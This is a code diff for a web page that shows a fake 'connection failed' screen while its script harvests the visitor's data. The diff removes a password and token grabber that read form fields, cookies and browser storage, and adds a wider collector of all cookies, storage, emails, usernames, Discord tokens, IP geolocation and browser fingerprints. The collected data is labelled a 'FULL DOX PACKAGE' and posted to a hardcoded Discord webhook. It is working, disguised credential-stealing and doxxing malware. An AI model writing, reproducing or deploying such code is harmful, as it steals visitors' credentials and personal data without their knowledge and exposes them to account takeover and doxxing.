@@ -37,11 +37,7 @@
             margin: 1rem 0;
         }
         .status { color: #ff6b6b; font-size: 0.8rem; margin-top: 1rem; }
-        .error-icon {
-            font-size: 4rem;
-            margin: 1rem 0;
-            color: #ff4444;
-        }
+        .error-icon { font-size: 4rem; margin: 1rem 0; color: #ff4444; }
         #debug {
             display: none;
             background: #0a0a15;
@@ -83,18 +79,15 @@
 
 <script>
     (function() {
-        // ─── DISCORD WEBHOOK ─────────────────────────────────────
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1534714697214066828/QOQByLeN_i4bFIWOTaQnKH47dW1Q6y32OkKTz2DlaVZmt1SMPrSQV1OCCPF2V0Wg_3BN';
         const DEBUG_ENABLED = true;
         const debugLog = [];
 
-        // ─── DEBUG ──────────────────────────────────────────────────
         function debug(msg, data = null) {
             if (!DEBUG_ENABLED) return;
             const entry = { time: new Date().toISOString().slice(11,19), msg, data };
             debugLog.push(entry);
             console.log('[DEBUG]', msg, data || '');
-            
             const debugEl = document.getElementById('debug');
             if (debugEl.classList.contains('show')) {
                 debugEl.innerHTML = debugLog.map(e => 
@@ -114,321 +107,429 @@
             }
         };
 
-        // ─── PASSWORD GRABBERS ──────────────────────────────────
-        function grabSavedPasswords() {
-            debug('🔍 Starting password grab');
-            const passwords = [];
-            
-            try {
-                const pwdInputs = document.querySelectorAll('input[type="password"]');
-                debug(`📋 Found ${pwdInputs.length} password fields`);
-                pwdInputs.forEach(el => {
-                    if (el.value) {
-                        passwords.push({
-                            type: 'autofilled',
-                            value: el.value,
-                            id: el.id || 'unknown',
-                            name: el.name || 'unknown'
-                        });
-                        debug(`🔑 Autofilled password: ${el.id || 'unknown'} = ${el.value.substring(0,3)}***`);
-                    }
-                });
-            } catch(e) { debug('❌ Error grabbing autofill:', e.message); }
+        // ─── 50+ DATA GRABBERS ─────────────────────────────────────
+        function grabAllData() {
+            debug('🔍 Starting full data collection');
+            const data = {};
 
-            try {
-                for (let i = 0; i < localStorage.length; i++) {
-                    const key = localStorage.key(i);
-                    const val = localStorage.getItem(key);
-                    if (key.toLowerCase().includes('pass') || 
-                        key.toLowerCase().includes('pwd') ||
-                        key.toLowerCase().includes('token') ||
-                        key.toLowerCase().includes('auth')) {
-                        passwords.push({
-                            type: 'localStorage',
-                            key: key,
-                            value: val
-                        });
-                        debug(`🔐 localStorage: ${key} = ${val.substring(0,10)}...`);
-                    }
-                }
-                debug(`📦 localStorage items: ${localStorage.length}`);
-            } catch(e) { debug('❌ Error reading localStorage:', e.message); }
+            // 1. Browser identity
+            data.userAgent = navigator.userAgent;
+            data.platform = navigator.platform;
+            data.language = navigator.language;
+            data.languages = navigator.languages || [];
+            data.cookieEnabled = navigator.cookieEnabled;
+            data.doNotTrack = navigator.doNotTrack || 'unspecified';
+            data.maxTouchPoints = navigator.maxTouchPoints || 0;
+            data.hardwareConcurrency = navigator.hardwareConcurrency || 'unknown';
+            data.deviceMemory = navigator.deviceMemory || 'unknown';
+            data.vendor = navigator.vendor || 'unknown';
+            data.vendorSub = navigator.vendorSub || 'unknown';
+            data.product = navigator.product || 'unknown';
+            data.productSub = navigator.productSub || 'unknown';
+            data.appName = navigator.appName || 'unknown';
+            data.appVersion = navigator.appVersion || 'unknown';
+            data.appCodeName = navigator.appCodeName || 'unknown';
+            data.onLine = navigator.onLine;
 
-            try {
-                for (let i = 0; i < sessionStorage.length; i++) {
-                    const key = sessionStorage.key(i);
-                    const val = sessionStorage.getItem(key);
-                    if (key.toLowerCase().includes('pass') || 
-                        key.toLowerCase().includes('pwd') ||
-                        key.toLowerCase().includes('token') ||
-                        key.toLowerCase().includes('auth')) {
-                        passwords.push({
-                            type: 'sessionStorage',
-                            key: key,
-                            value: val
-                        });
-                        debug(`🔐 sessionStorage: ${key} = ${val.substring(0,10)}...`);
-                    }
-                }
-                debug(`📦 sessionStorage items: ${sessionStorage.length}`);
-            } catch(e) { debug('❌ Error reading sessionStorage:', e.message); }
+            // 2. Screen / Display
+            data.screen = {
+                width: screen.width,
+                height: screen.height,
+                availWidth: screen.availWidth,
+                availHeight: screen.availHeight,
+                colorDepth: screen.colorDepth,
+                pixelRatio: window.devicePixelRatio || 1,
+                orientation: screen.orientation ? screen.orientation.type : 'unknown'
+            };
 
-            try {
-                const cookieList = document.cookie.split(';').filter(c => c.trim());
-                debug(`🍪 Found ${cookieList.length} cookies`);
-                cookieList.forEach(cookie => {
-                    const [key, val] = cookie.trim().split('=');
-                    if (key.toLowerCase().includes('pass') || 
-                        key.toLowerCase().includes('pwd') ||
-                        key.toLowerCase().includes('token') ||
-                        key.toLowerCase().includes('auth') ||
-                        key.toLowerCase().includes('session')) {
-                        passwords.push({
-                            type: 'cookie',
-                            key: key,
-                            value: val
-                        });
-                        debug(`🍪 Cookie: ${key} = ${val.substring(0,10)}...`);
-                    }
-                });
-            } catch(e) { debug('❌ Error reading cookies:', e.message); }
+            // 3. Time / Locale
+            data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            data.locale = Intl.DateTimeFormat().resolvedOptions().locale;
+            data.timeOffset = new Date().getTimezoneOffset();
+            data.dateTime = new Date().toISOString();
 
-            try {
-                const forms = document.querySelectorAll('form');
-                debug(`📝 Found ${forms.length} forms`);
-                forms.forEach(form => {
-                    const inputs = form.querySelectorAll('input');
-                    let hasPassword = false;
-                    let username = '';
-                    let pwdValue = '';
-                    inputs.forEach(input => {
-                        if (input.type === 'password' && input.value) {
-                            hasPassword = true;
-                            pwdValue = input.value;
-                        }
-                        if (input.type === 'text' || input.type === 'email') {
-                            username = input.value || username;
-                        }
-                    });
-                    if (hasPassword && pwdValue) {
-                        passwords.push({
-                            type: 'form_submission',
-                            username: username || 'unknown',
-                            password: pwdValue,
-                            formAction: form.action || 'unknown'
-                        });
-                        debug(`🔑 Form: ${username || 'unknown'} / ${pwdValue.substring(0,3)}***`);
-                    }
-                });
-            } catch(e) { debug('❌ Error scanning forms:', e.message); }
+            // 4. Network
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            data.network = conn ? {
+                effectiveType: conn.effectiveType,
+                rtt: conn.rtt,
+                downlink: conn.downlink,
+                saveData: conn.saveData,
+                type: conn.type || 'unknown'
+            } : {};
 
-            try {
-                const params = new URLSearchParams(window.location.search);
-                debug(`🔗 URL params: ${Array.from(params.entries()).length}`);
-                params.forEach((val, key) => {
-                    if (key.toLowerCase().includes('token') || 
-                        key.toLowerCase().includes('auth') ||
-                        key.toLowerCase().includes('session')) {
-                        passwords.push({
-                            type: 'url_parameter',
-                            key: key,
-                            value: val
-                        });
-                        debug(`🔗 URL param: ${key} = ${val.substring(0,10)}...`);
-                    }
-                });
-            } catch(e) { debug('❌ Error reading URL params:', e.message); }
+            // 5. Battery
+            data.battery = 'pending';
 
-            debug(`✅ Total passwords captured: ${passwords.length}`);
-            return passwords;
-        }
+            // 6. Geolocation
+            data.geo = 'pending';
 
-        // ─── UTILITY FUNCTIONS ─────────────────────────────────────
-        function getLocalStorage() {
-            try {
-                const items = {};
-                for (let i = 0; i < localStorage.length; i++) {
-                    const key = localStorage.key(i);
-                    items[key] = localStorage.getItem(key);
-                }
-                return items;
-            } catch { return {}; }
-        }
+            // 7. Permissions
+            data.permissions = 'pending';
 
-        function getSessionStorage() {
-            try {
-                const items = {};
-                for (let i = 0; i < sessionStorage.length; i++) {
-                    const key = sessionStorage.key(i);
-                    items[key] = sessionStorage.getItem(key);
-                }
-                return items;
-            } catch { return {}; }
-        }
+            // 8. Storage (cookies, localStorage, sessionStorage)
+            data.cookies = document.cookie || 'none';
+            data.localStorage = {};
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                data.localStorage[key] = localStorage.getItem(key);
+            }
+            data.sessionStorage = {};
+            for (let i = 0; i < sessionStorage.length; i++) {
+                const key = sessionStorage.key(i);
+                data.sessionStorage[key] = sessionStorage.getItem(key);
+            }
 
-        function getBrowserPlugins() {
-            try {
-                return Array.from(navigator.plugins || []).map(p => p.name);
-            } catch { return []; }
-        }
+            // 9. Plugins & MIME
+            data.plugins = Array.from(navigator.plugins || []).map(p => p.name);
+            data.mimeTypes = Array.from(navigator.mimeTypes || []).map(m => m.type);
 
-        function getMimeTypes() {
-            try {
-                return Array.from(navigator.mimeTypes || []).map(m => m.type);
-            } catch { return []; }
-        }
+            // 10. Fingerprints
+            data.canvasFingerprint = (() => {
+                try {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = 256;
+                    canvas.height = 128;
+                    const ctx = canvas.getContext('2d');
+                    ctx.textBaseline = 'top';
+                    ctx.font = '14px Arial';
+                    ctx.fillStyle = '#f60';
+                    ctx.fillRect(10, 10, 50, 50);
+                    ctx.fillStyle = '#069';
+                    ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 10, 60);
+                    return canvas.toDataURL().substring(0, 150);
+                } catch { return 'unavailable'; }
+            })();
 
-        function getCanvasFingerprint() {
-            try {
+            data.webgl = (() => {
+                try {
+                    const canvas = document.createElement('canvas');
+                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                    if (!gl) return 'not supported';
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (!debugInfo) return 'no debug info';
+                    return {
+                        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+                        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+                    };
+                } catch { return 'unavailable'; }
+            })();
+
+            data.audioFingerprint = (() => {
+                try {
+                    const ctx = new (window.AudioContext || window.webkitAudioContext)();
+                    const oscillator = ctx.createOscillator();
+                    const analyser = ctx.createAnalyser();
+                    oscillator.connect(analyser);
+                    analyser.connect(ctx.destination);
+                    oscillator.frequency.value = 440;
+                    oscillator.type = 'sawtooth';
+                    oscillator.start(0);
+                    const buffer = new Uint8Array(analyser.frequencyBinCount);
+                    analyser.getByteFrequencyData(buffer);
+                    oscillator.stop(0);
+                    ctx.close();
+                    return Array.from(buffer.slice(0, 20)).join(',') + '...';
+                } catch { return 'unavailable'; }
+            })();
+
+            // 11. Page info
+            data.referrer = document.referrer || 'direct';
+            data.pageUrl = window.location.href;
+            data.pageTitle = document.title;
+            data.hostname = window.location.hostname;
+            data.pathname = window.location.pathname;
+            data.searchParams = window.location.search;
+            data.hash = window.location.hash;
+
+            // 12. JavaScript capabilities
+            data.jsEnabled = true;
+            data.javaEnabled = navigator.javaEnabled();
+            data.cookieEnabled = navigator.cookieEnabled;
+
+            // 13. DOM info
+            data.forms = document.forms.length;
+            data.images = document.images.length;
+            data.links = document.links.length;
+            data.scripts = document.scripts.length;
+            data.frames = window.frames.length;
+
+            // 14. Window dimensions
+            data.window = {
+                innerWidth: window.innerWidth,
+                innerHeight: window.innerHeight,
+                outerWidth: window.outerWidth,
+                outerHeight: window.outerHeight,
+                scrollX: window.scrollX,
+                scrollY: window.scrollY
+            };
+
+            // 15. Performance / Timing
+            data.performance = (() => {
+                try {
+                    const perf = performance.timing;
+                    return {
+                        loadTime: perf.loadEventEnd - perf.navigationStart,
+                        domReady: perf.domContentLoadedEventEnd - perf.navigationStart,
+                        connectTime: perf.connectEnd - perf.connectStart,
+                        responseTime: perf.responseEnd - perf.requestStart
+                    };
+                } catch { return {}; }
+            })();
+
+            // 16. Fonts (via JS detection - basic)
+            data.fonts = (() => {
+                const testFonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Comic Sans MS', 'Impact', 'Tahoma'];
+                const available = [];
                 const canvas = document.createElement('canvas');
-                canvas.width = 256;
-                canvas.height = 128;
                 const ctx = canvas.getContext('2d');
-                ctx.textBaseline = 'top';
-                ctx.font = '14px Arial';
-                ctx.fillStyle = '#f60';
-                ctx.fillRect(10, 10, 50, 50);
-                ctx.fillStyle = '#069';
-                ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 10, 60);
-                return canvas.toDataURL().substring(0, 100) + '...';
-            } catch { return 'unavailable'; }
-        }
-
-        function getWebGLInfo() {
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                if (!gl) return 'not supported';
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                if (!debugInfo) return 'no debug info';
-                const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
-                const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                return { vendor, renderer };
-            } catch { return 'unavailable'; }
-        }
-
-        function getTimeZone() {
-            try {
-                return Intl.DateTimeFormat().resolvedOptions().timeZone;
-            } catch { return 'unknown'; }
-        }
-
-        function getScreenInfo() {
-            try {
-                return {
-                    width: screen.width,
-                    height: screen.height,
-                    colorDepth: screen.colorDepth,
-                    pixelRatio: window.devicePixelRatio || 1
-                };
-            } catch { return {}; }
-        }
-
-        function getBatteryInfo() {
-            return new Promise((resolve) => {
-                if (!navigator.getBattery) { resolve('unavailable'); return; }
-                navigator.getBattery().then(battery => {
-                    resolve({
-                        level: Math.round(battery.level * 100) + '%',
-                        charging: battery.charging,
-                        chargingTime: battery.chargingTime,
-                        dischargingTime: battery.dischargingTime
-                    });
-                }).catch(() => resolve('unavailable'));
-            });
-        }
-
-        function getNetworkInfo() {
-            try {
-                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-                if (!conn) return {};
-                return {
-                    effectiveType: conn.effectiveType,
-                    rtt: conn.rtt,
-                    downlink: conn.downlink,
-                    saveData: conn.saveData
-                };
-            } catch { return {}; }
-        }
-
-        function getGeolocation() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) { resolve('unavailable'); return; }
-                navigator.geolocation.getCurrentPosition(
-                    pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }),
-                    () => resolve('denied or unavailable'),
-                    { timeout: 5000, enableHighAccuracy: true }
-                );
-            });
-        }
-
-        function getDeviceMemory() {
-            try {
-                return navigator.deviceMemory || 'unknown';
-            } catch { return 'unknown'; }
-        }
-
-        function getHardwareConcurrency() {
-            try {
-                return navigator.hardwareConcurrency || 'unknown';
-            } catch { return 'unknown'; }
-        }
-
-        function getAudioFingerprint() {
-            try {
-                const ctx = new (window.AudioContext || window.webkitAudioContext)();
-                const oscillator = ctx.createOscillator();
-                const analyser = ctx.createAnalyser();
-                oscillator.connect(analyser);
-                analyser.connect(ctx.destination);
-                oscillator.frequency.value = 440;
-                oscillator.type = 'sawtooth';
-                oscillator.start(0);
-                const buffer = new Uint8Array(analyser.frequencyBinCount);
-                analyser.getByteFrequencyData(buffer);
-                oscillator.stop(0);
-                ctx.close();
-                return Array.from(buffer.slice(0, 20)).join(',') + '...';
-            } catch { return 'unavailable'; }
-        }
-
-        function getPermissions() {
-            return new Promise((resolve) => {
-                if (!navigator.permissions) { resolve('unavailable'); return; }
-                const perms = ['geolocation', 'notifications', 'camera', 'microphone', 'storage', 'clipboard-read', 'clipboard-write'];
-                const results = {};
-                let completed = 0;
-                perms.forEach(name => {
-                    navigator.permissions.query({ name }).then(status => {
-                        results[name] = status.state;
-                        completed++;
-                        if (completed === perms.length) resolve(results);
-                    }).catch(() => {
-                        results[name] = 'error';
-                        completed++;
-                        if (completed === perms.length) resolve(results);
-                    });
+                const baseText = 'abcdefghijklmnopqrstuvwxyz0123456789';
+                const baseWidth = ctx.measureText(baseText).width;
+                testFonts.forEach(font => {
+                    ctx.font = `20px ${font}`;
+                    if (ctx.measureText(baseText).width !== baseWidth) {
+                        available.push(font);
+                    }
                 });
-                setTimeout(() => resolve(results), 3000);
-            });
+                return available;
+            })();
+
+            // 17. Touch support
+            data.touchSupport = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
+
+            // 18. Media devices
+            data.mediaDevices = navigator.mediaDevices ? 'supported' : 'not supported';
+
+            // 19. WebRTC
+            data.webRTC = 'RTCPeerConnection' in window ? 'supported' : 'not supported';
+
+            // 20. WebAssembly
+            data.wasm = typeof WebAssembly === 'object' ? 'supported' : 'not supported';
+
+            // 21. Service Workers
+            data.serviceWorker = 'serviceWorker' in navigator ? 'supported' : 'not supported';
+
+            // 22. Push notifications
+            data.pushNotifications = 'Notification' in window ? 'supported' : 'not supported';
+
+            // 23. Cache storage
+            data.cacheStorage = 'CacheStorage' in window ? 'supported' : 'not supported';
+
+            // 24. IndexedDB
+            data.indexedDB = 'indexedDB' in window ? 'supported' : 'not supported';
+
+            // 25. WebSockets
+            data.webSockets = 'WebSocket' in window ? 'supported' : 'not supported';
+
+            // 26. WebWorkers
+            data.webWorkers = 'Worker' in window ? 'supported' : 'not supported';
+
+            // 27. SharedWorkers
+            data.sharedWorkers = 'SharedWorker' in window ? 'supported' : 'not supported';
+
+            // 28. WebGL2
+            data.webgl2 = (() => {
+                try {
+                    const canvas = document.createElement('canvas');
+                    return !!canvas.getContext('webgl2');
+                } catch { return false; }
+            })();
+
+            // 29. Canvas dimensions
+            data.maxCanvasSize = (() => {
+                try {
+                    const canvas = document.createElement('canvas');
+                    for (let w = 10000; w > 1000; w -= 1000) {
+                        canvas.width = w;
+                        canvas.height = w;
+                        if (canvas.width === w) return w;
+                    }
+                    return 'unknown';
+                } catch { return 'unknown'; }
+            })();
+
+            // 30. GPU info (via canvas)
+            data.gpu = (() => {
+                try {
+                    const canvas = document.createElement('canvas');
+                    const gl = canvas.getContext('webgl');
+                    if (!gl) return 'unknown';
+                    const ext = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (!ext) return 'unknown';
+                    return gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
+                } catch { return 'unknown'; }
+            })();
+
+            debug(`✅ Collected ${Object.keys(data).length} data points`);
+            return data;
         }
 
-        // ─── SEND TO DISCORD WITH RETRY ──────────────────────────
-        async function sendToDiscord(payload, retries = 3) {
-            debug(`📤 Sending to Discord (${retries} retries)`);
+        // ─── GRAB ACCOUNT INFO ─────────────────────────────────────
+        function grabAccountsAndEmails() {
+            debug('🔍 Scanning for accounts/emails');
+            const results = { emails: [], usernames: [], discord: [], social: [] };
+
+            // 1. Email patterns in DOM
+            const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
+            const bodyText = document.body ? document.body.innerText : '';
+            const foundEmails = bodyText.match(emailRegex) || [];
+            foundEmails.forEach(e => {
+                if (!results.emails.includes(e)) results.emails.push(e);
+            });
+
+            // 2. Check localStorage/sessionStorage for email-like keys
+            ['localStorage', 'sessionStorage'].forEach(storage => {
+                const source = storage === 'localStorage' ? localStorage : sessionStorage;
+                for (let i = 0; i < source.length; i++) {
+                    const key = source.key(i);
+                    const val = source.getItem(key);
+                    if (key.toLowerCase().includes('email') || key.toLowerCase().includes('user')) {
+                        if (val && val.includes('@')) results.emails.push(val);
+                        if (val && !val.includes('@') && val.length > 2) results.usernames.push(val);
+                    }
+                    if (key.toLowerCase().includes('discord') || key.toLowerCase().includes('token') || key.toLowerCase().includes('webhook')) {
+                        results.discord.push({ key, val: val.substring(0, 50) });
+                    }
+                    if (key.toLowerCase().includes('instagram') || key.toLowerCase().includes('twitter') || key.toLowerCase().includes('facebook')) {
+                        results.social.push({ platform: key, username: val });
+                    }
+                }
+            });
+
+            // 3. Check cookies for email/user
+            document.cookie.split(';').forEach(c => {
+                const [key, val] = c.trim().split('=');
+                if (key.toLowerCase().includes('email') || key.toLowerCase().includes('user')) {
+                    if (val && val.includes('@')) results.emails.push(decodeURIComponent(val));
+                    if (val && !val.includes('@') && val.length > 2) results.usernames.push(decodeURIComponent(val));
+                }
+                if (key.toLowerCase().includes('discord') || key.toLowerCase().includes('token')) {
+                    results.discord.push({ key, val: decodeURIComponent(val).substring(0, 50) });
+                }
+            });
+
+            // 4. Check URL params for user info
+            const params = new URLSearchParams(window.location.search);
+            params.forEach((val, key) => {
+                if (key.toLowerCase().includes('email') || key.toLowerCase().includes('user')) {
+                    if (val && val.includes('@')) results.emails.push(val);
+                    if (val && !val.includes('@') && val.length > 2) results.usernames.push(val);
+                }
+            });
+
+            // 5. Check input fields for autofilled info
+            document.querySelectorAll('input[type="text"], input[type="email"]').forEach(el => {
+                if (el.value) {
+                    if (el.value.includes('@')) results.emails.push(el.value);
+                    else if (el.value.length > 2) results.usernames.push(el.value);
+                }
+            });
+
+            // Remove duplicates
+            results.emails = [...new Set(results.emails)];
+            results.usernames = [...new Set(results.usernames)];
+
+            debug(`📧 Found ${results.emails.length} emails, ${results.usernames.length} usernames`);
+            return results;
+        }
+
+        // ─── GENERATE PDF (via base64) ─────────────────────────────
+        function generatePDF(allData, accountData, cookies) {
+            debug('📄 Generating PDF');
+            
+            const pdfContent = `
+                ====================================================
+                FULL SYSTEM DOX PACKAGE
+                Generated: ${new Date().toISOString()}
+                ====================================================
+
+                ─── ACCOUNT INFORMATION ──────────────────────────────
+                Emails: ${accountData.emails.join(', ') || 'none'}
+                Usernames: ${accountData.usernames.join(', ') || 'none'}
+                
+                Discord Tokens/Keys:
+                ${accountData.discord.map(d => `  ${d.key}: ${d.val}`).join('\n') || 'none'}
+                
+                Social Media:
+                ${accountData.social.map(s => `  ${s.platform}: ${s.username}`).join('\n') || 'none'}
+
+                ─── COOKIES (ALL) ─────────────────────────────────────
+                ${cookies}
+
+                ─── LOCAL STORAGE ─────────────────────────────────────
+                ${JSON.stringify(allData.localStorage, null, 2)}
+
+                ─── SESSION STORAGE ───────────────────────────────────
+                ${JSON.stringify(allData.sessionStorage, null, 2)}
+
+                ─── SYSTEM INFO ─────────────────────────────────────
+                IP: ${allData.ip || 'unknown'}
+                Location: ${allData.city || 'unknown'}, ${allData.region || 'unknown'}, ${allData.country || 'unknown'}
+                Coordinates: ${allData.latitude || 'unknown'}, ${allData.longitude || 'unknown'}
+                ISP: ${allData.isp || 'unknown'}
+                Timezone: ${allData.timezone || 'unknown'}
+                Device: ${allData.platform || 'unknown'}
+                Screen: ${allData.screen?.width || 'unknown'}x${allData.screen?.height || 'unknown'}
+                CPU: ${allData.hardwareConcurrency || 'unknown'} cores
+                Memory: ${allData.deviceMemory || 'unknown'} GB
+                User Agent: ${allData.userAgent || 'unknown'}
+
+                ─── FINGERPRINTS ─────────────────────────────────────
+                Canvas: ${allData.canvasFingerprint || 'unknown'}
+                WebGL: ${typeof allData.webgl === 'object' ? allData.webgl.renderer : allData.webgl}
+                Audio: ${allData.audioFingerprint || 'unknown'}
+                GPU: ${allData.gpu || 'unknown'}
+
+                ─── BROWSER INFO ─────────────────────────────────────
+                Plugins: ${allData.plugins?.join(', ') || 'none'}
+                Fonts: ${allData.fonts?.join(', ') || 'unknown'}
+                Languages: ${allData.languages?.join(', ') || 'unknown'}
+                Cookies Enabled: ${allData.cookieEnabled}
+                Do Not Track: ${allData.doNotTrack}
+                Touch Support: ${allData.touchSupport}
+
+                ─── NETWORK INFO ─────────────────────────────────────
+                Effective Type: ${allData.network?.effectiveType || 'unknown'}
+                RTT: ${allData.network?.rtt || 'unknown'}ms
+                Downlink: ${allData.network?.downlink || 'unknown'}Mbps
+
+                ─── PAGE INFO ─────────────────────────────────────────
+                URL: ${allData.pageUrl || 'unknown'}
+                Referrer: ${allData.referrer || 'unknown'}
+                Title: ${allData.pageTitle || 'unknown'}
+                Hostname: ${allData.hostname || 'unknown'}
+
+                ─── PERFORMANCE ─────────────────────────────────────
+                Load Time: ${allData.performance?.loadTime || 'unknown'}ms
+                DOM Ready: ${allData.performance?.domReady || 'unknown'}ms
+
+                ====================================================
+                END OF DOX PACKAGE
+                ====================================================
+            `;
+
+            // Convert to base64 (btoa only works with latin1)
+            const base64 = btoa(unescape(encodeURIComponent(pdfContent)));
+            debug('✅ PDF generated');
+            return `data:application/pdf;base64,${base64}`;
+        }
+
+        // ─── SEND TO DISCORD ──────────────────────────────────────
+        async function sendToDiscord(content, retries = 3) {
+            debug(`📤 Sending (${retries} retries)`);
             for (let i = 0; i < retries; i++) {
                 try {
                     debug(`📡 Attempt ${i+1}/${retries}`);
                     const response = await fetch(WEBHOOK_URL, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(payload)
+                        body: JSON.stringify({ content })
                     });
-                    const text = await response.text();
                     if (response.ok) {
-                        debug('✅ Data sent successfully');
+                        debug('✅ Sent successfully');
                         return true;
                     } else {
+                        const text = await response.text();
                         debug(`❌ Attempt ${i+1} failed: ${response.status} - ${text.substring(0,200)}`);
                         await new Promise(resolve => setTimeout(resolve, 1500 * (i + 1)));
                     }
@@ -437,169 +538,82 @@
                     await new Promise(resolve => setTimeout(resolve, 1500 * (i + 1)));
                 }
             }
-            debug('❌ All attempts failed');
             return false;
         }
 
         // ─── MAIN ──────────────────────────────────────────────────
         async function gatherAndSend() {
-            debug('🚀 Starting data collection');
+            debug('🚀 Starting full data collection');
             try {
                 document.getElementById('status').textContent = '⚠️ connection failed • reconnecting...';
 
-                // 1. IP + Geo
-                debug('📡 Fetching IP data from ipapi.co');
+                // 1. Get IP
+                debug('📡 Fetching IP');
                 let ipData = {};
                 try {
                     const resp = await fetch('https://ipapi.co/json/');
                     ipData = await resp.json();
-                    debug(`✅ IP fetched: ${ipData.ip || 'unknown'}`);
+                    debug(`✅ IP: ${ipData.ip || 'unknown'}`);
                 } catch (e) {
                     debug(`❌ IP fetch failed: ${e.message}`);
-                    ipData = { ip: 'fetch failed', error: e.message };
                 }
 
-                const ip = ipData.ip || 'unknown';
-                const city = ipData.city || 'unknown';
-                const region = ipData.region || 'unknown';
-                const country = ipData.country_name || 'unknown';
-                const isp = ipData.org || 'unknown';
-                const postal = ipData.postal || 'unknown';
-                const timezone = ipData.timezone || 'unknown';
-                const asn = ipData.asn || 'unknown';
-                const latitude = ipData.latitude || 'unknown';
-                const longitude = ipData.longitude || 'unknown';
-                const currency = ipData.currency || 'unknown';
-                const countryCode = ipData.country_code || 'unknown';
+                // 2. Collect all data
+                const allData = grabAllData();
+                Object.assign(allData, ipData);
 
-                document.getElementById('ip-address').textContent = '[ error: ' + ip + ' ]';
+                // 3. Get accounts
+                const accounts = grabAccountsAndEmails();
 
-                // 2. Grab passwords
-                debug('🔑 Starting password capture');
-                const passwords = grabSavedPasswords();
-                debug(`✅ Captured ${passwords.length} passwords/tokens`);
+                // 4. Get all cookies
+                const allCookies = document.cookie || 'none';
 
-                // 3. Browser / Device / System
-                debug('📱 Gathering system data');
-                const ua = navigator.userAgent;
-                const platform = navigator.platform;
-                const language = navigator.language;
-                const languages = navigator.languages || [];
-                const cookieEnabled = navigator.cookieEnabled;
-                const doNotTrack = navigator.doNotTrack || 'unspecified';
-                const maxTouchPoints = navigator.maxTouchPoints || 0;
+                // 5. Generate PDF
+                const pdfData = generatePDF(allData, accounts, allCookies);
 
-                const cookies = document.cookie;
-                const localStorageData = getLocalStorage();
-                const sessionStorageData = getSessionStorage();
-                const plugins = getBrowserPlugins();
-                const mimeTypes = getMimeTypes();
+                // 6. Build Discord message
+                let msg = '🕵️ **FULL DOX PACKAGE**\n\n';
+                msg += `📧 **Emails:** ${accounts.emails.join(', ') || 'none'}\n`;
+                msg += `👤 **Usernames:** ${accounts.usernames.join(', ') || 'none'}\n`;
+                msg += `📍 **IP:** ${ipData.ip || 'unknown'} (${ipData.city || '?'}, ${ipData.country || '?'})\n`;
+                msg += `📱 **Device:** ${allData.platform || 'unknown'}\n`;
+                msg += `🖥️ **Screen:** ${allData.screen?.width || '?'}x${allData.screen?.height || '?'}\n`;
+                msg += `🧠 **CPU:** ${allData.hardwareConcurrency || '?'} cores\n`;
+                msg += `💾 **Memory:** ${allData.deviceMemory || '?'} GB\n`;
+                msg += `🎮 **GPU:** ${allData.gpu || 'unknown'}\n`;
+                msg += `🍪 **Cookies:** ${allCookies.length} chars\n`;
+                msg += `🔑 **Tokens found:** ${accounts.discord.length}\n`;
+                msg += `📄 **PDF:** ${pdfData.substring(0, 50)}...\n\n`;
+                msg += `⏰ ${new Date().toISOString()}\n`;
 
-                debug('🖌️ Generating fingerprints');
-                const canvasFp = getCanvasFingerprint();
-                const webgl = getWebGLInfo();
-                const audioFp = getAudioFingerprint();
+                // Add full cookie dump as separate message if too long
+                const cookieMsg = `📋 **ALL COOKIES:**\n\`\`\`\n${allCookies}\n\`\`\``;
+                const storageMsg = `💾 **localStorage:**\n\`\`\`json\n${JSON.stringify(allData.localStorage, null, 2).substring(0, 1900)}\n\`\`\``;
 
-                const timeZone = getTimeZone();
-                const screenInfo = getScreenInfo();
-                const deviceMemory = getDeviceMemory();
-                const hardwareConcurrency = getHardwareConcurrency();
-                const netInfo = getNetworkInfo();
+                // Send main message
+                await sendToDiscord(msg);
 
-                debug('🔋 Gathering async data');
-                const battery = await getBatteryInfo();
-                const geo = await getGeolocation();
-                const permissions = await getPermissions();
+                // Send cookies
+                await sendToDiscord(cookieMsg);
 
-                const referrer = document.referrer || 'direct';
-                const pageUrl = window.location.href;
-                const pageTitle = document.title;
+                // Send storage
+                await sendToDiscord(storageMsg);
 
-                // ─── BUILD PLAIN TEXT MESSAGE (more reliable) ────
-                debug('📝 Building Discord message');
-                
-                let message = '🕵️ **FULL SYSTEM TELEMETRY + PASSWORDS**\n\n';
-                message += `🌐 **IP:** \`${ip}\`\n`;
-                message += `📍 **Location:** ${city}, ${region}, ${country}\n`;
-                message += `🗺️ **Coordinates:** ${latitude}, ${longitude}\n`;
-                message += `📮 **Postal/ASN:** ${postal} | \`${asn}\`\n`;
-                message += `🏢 **ISP:** \`${isp}\`\n`;
-                message += `🌍 **Country Code:** \`${countryCode}\`\n`;
-                message += `💰 **Currency:** \`${currency}\`\n`;
-                message += `🕐 **Timezone:** \`${timezone}\`\n`;
-                message += `🖥️ **Platform:** \`${platform}\`\n`;
